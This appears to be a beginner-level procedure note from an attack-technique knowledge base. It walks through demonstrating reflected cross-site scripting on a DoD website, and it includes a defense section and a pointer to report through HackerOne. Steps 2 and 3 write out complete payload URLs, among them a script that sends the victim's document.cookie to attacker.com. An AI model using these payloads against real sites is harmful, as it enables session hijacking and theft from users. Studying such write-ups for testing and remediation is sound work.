---
tags:
  - xss
  - web
  - injection
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 1b6e6373-9646-4307-98c4-537eb47b437f
created_at: '2025-12-14T03:15:41.323Z'
updated_at: '2025-12-14T03:15:41.323Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Demonstrate-XSS-via-Crafted-URL

## Summary

This procedure demonstrates a reflected cross-site scripting (XSS) vulnerability by crafting a malicious URL that injects JavaScript into a vulnerable web parameter on the target DoD website, allowing execution in the victim's browser to steal session data or alter page content.

## Description

In a reflected XSS attack, user input from a URL parameter is not properly sanitized or encoded before being reflected back into the HTML response. An attacker crafts a URL embedding a script payload (e.g., <script>alert(1)</script>) in a parameter like a search query. When a victim clicks the link, the browser parses the unsanitized input as executable code. On the DoD website, this vulnerability was found in an unspecified endpoint, enabling potential disclosure of session tokens or manipulation of displayed content. Prerequisites include identifying reflectable inputs via manual testing or automated scanners, and the attack requires no authentication, relying on social engineering for delivery.

## Requirements

1. Access to a web browser with developer tools for testing payloads
2. Knowledge of the target URL and vulnerable parameters (e.g., via reconnaissance)
3. An attacker-controlled domain for exfiltration (optional for advanced payloads)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML-encode user inputs using libraries like OWASP ESAPI)
- Use Content Security Policy (CSP) headers to restrict script execution
- Monitor web logs for suspicious URL patterns with encoded scripts
- Employ Web Application Firewalls (WAFs) to block common XSS payloads

## Objectives

1. Inject and execute arbitrary JavaScript in the victim's browser context
2. Exfiltrate sensitive data like session cookies to an attacker server
3. Demonstrate the vulnerability for reporting and remediation

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Manually inspect the target website for inputs that reflect user data unsanitized, such as search boxes, error pages, or URL parameters.

Navigate to the DoD website and test parameters by appending benign inputs like `?q=test` and checking the response source for direct reflection.

### Step 2: Craft Basic Test Payload

**Context**: Construct a simple URL to verify script execution without harming the target.

Use a payload like `<script>alert('XSS')</script>` in the vulnerable parameter. Example URL: `https://target.dod.mil/search?q=<script>alert('XSS')</script>`.

Visit the URL; if vulnerable, an alert box should appear.

### Step 3: Escalate to Data Exfiltration

**Context**: Replace the test with a payload that steals and sends session data.

Advanced payload example: `<script>var i=new Image();i.src='http://attacker.com/log?cookie='+document.cookie;</script>`. Full URL: `https://target.dod.mil/search?q=<script>var i=new Image();i.src='http://attacker.com/log?cookie='+document.cookie;</script>`.

Visit and check the attacker's server logs for received cookies.

### Step 4: Verify and Report

**Context**: Confirm impact and document for disclosure.

Use browser dev tools (F12) to inspect network requests and console for errors. Report via HackerOne with proof-of-concept URL and screenshots.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web]]
- [[injection]]
- [[JavaScript]]
